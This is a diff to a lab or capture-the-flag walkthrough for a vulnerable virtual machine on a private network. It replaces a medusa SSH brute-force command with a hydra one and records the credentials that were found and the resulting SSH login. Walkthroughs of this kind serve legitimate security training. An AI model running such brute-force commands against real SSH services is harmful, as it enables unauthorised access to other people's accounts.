@@ -107,10 +107,21 @@ http://192.168.114.134/0x0856BF/
 # Exploit 
 
 We seem to have found possible usernames and passwords.
-We attempt to brute force using medusa
+According to the folder password is located in Pass.txt
+We attempt to brute force using hydra
 ```
-medusa -U username.txt -P Pass.txt -h 192.168.114.134 -M ssh -v 6
+hydra -L username.txt -P Pass.txt 192.168.114.134 ssh -vv
 ```
+Can't seem to find a match.
+We try to include the Pass.txt name in the file and try again.
+```
+[22][ssh] host: 192.168.114.134   login: overflow   password: Pass.txt
+```
+```
+ssh overflow@192.168.114.134
+Password: Pass.txt
+```
+
 
 
 
